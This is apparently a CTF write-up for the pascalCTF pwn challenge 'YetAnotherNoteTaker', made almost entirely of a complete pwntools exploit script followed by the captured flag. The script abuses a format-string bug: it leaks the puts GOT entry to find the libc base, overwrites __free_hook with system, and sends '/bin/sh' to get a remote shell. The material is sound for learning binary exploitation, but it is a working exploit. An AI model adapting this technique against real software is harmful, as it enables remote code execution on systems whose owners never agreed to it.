# pwn - YetAnotherNoteTaker

```
from pwn import *

# --- Configuration ---
exe_path = './notetaker'
libc_path = './libs/libc.so.6'  # Fixed path based on your ls output
host = 'notetaker.ctf.pascalctf.it'
port = 9002

# --- Setup ---
context.binary = elf = ELF(exe_path, checksec=False)
libc = ELF(libc_path, checksec=False)

# Connect
# io = process(exe_path) # Uncomment for local testing
io = remote(host, port)

def write_note(payload):
    io.sendlineafter(b'> ', b'2')
    # Use sendline for the note content
    io.sendlineafter(b'note: ', payload)

def read_note():
    io.sendlineafter(b'> ', b'1')
    # It prints the note, then the menu again. We grab until the menu.
    return io.recvuntil(b'\n1. Read', drop=True)

# --- 1. Find Format String Offset ---
log.info("Calculating format string offset...")

def exec_fmt(payload):
    write_note(payload)
    return read_note()

# FmtStr automates calculating the offset (likely 6 for 64-bit)
format_string = FmtStr(exec_fmt)
offset = format_string.offset
log.success(f"Offset found: {offset}")

# --- 2. Leak Libc Address (GOT Method) ---
# We will leak the real address of 'puts' inside libc using the format string.
# Payload logic: %X$s + padding + address_of_puts_got
# X = offset + 1 (because the address is placed AFTER the format specifier on the stack)

puts_got = elf.got['puts']
log.info(f"puts@got address: {hex(puts_got)}")

# Construct payload: "%7$s" (4 bytes) + "AAAA" (4 bytes) + [puts_got address]
# This aligns the address to the 8-byte boundary required for 64-bit stack arguments.
# Note: "offset + 1" works if the format string part is exactly 8 bytes long.
leak_payload = f"%{offset+1}$s".encode() 
leak_payload += b"A" * (8 - len(leak_payload)) # Pad to 8 bytes
leak_payload += p64(puts_got)

write_note(leak_payload)
leak_data = read_note()

# Clean up the output to get just the address
# The output will look like: [Raw Address Bytes]AAAA...
# We take the first 6 bytes (standard 64-bit address size) and unpack.
leak_bytes = leak_data[:6] + b'\x00\x00'
puts_addr = u64(leak_bytes)

log.success(f"Leaked puts address: {hex(puts_addr)}")

# --- 3. Calculate Libc Base & Targets ---
libc.address = puts_addr - libc.symbols['puts']
log.success(f"Libc Base: {hex(libc.address)}")

free_hook = libc.symbols['__free_hook']
system_addr = libc.symbols['system']

log.info(f"__free_hook: {hex(free_hook)}")
log.info(f"system: {hex(system_addr)}")

# --- 4. Overwrite __free_hook ---
# We use pwntools fmtstr_payload to generate the %n payload automatically
write_payload = fmtstr_payload(offset, {free_hook: system_addr})

log.info("Overwriting __free_hook with system...")
write_note(write_payload)

# Trigger the format string execution by "reading" the note
read_note()

# --- 5. Pop Shell ---
# Now that __free_hook points to system, calling free(ptr) -> system(ptr).
# The menu loop does: input = read(); ... free(input);
# So we just send "/bin/sh" as a menu choice.

log.success("Hook overwritten! Sending /bin/sh...")
io.sendlineafter(b'> ', b'/bin/sh')

io.interactive()
```
Flag:`⁨⁨pascalCTF{d1d_y0u_fr_h00k3d_th3_h3ap?}⁩⁩`

SOLVED by Ha1qal

Solved by: yappare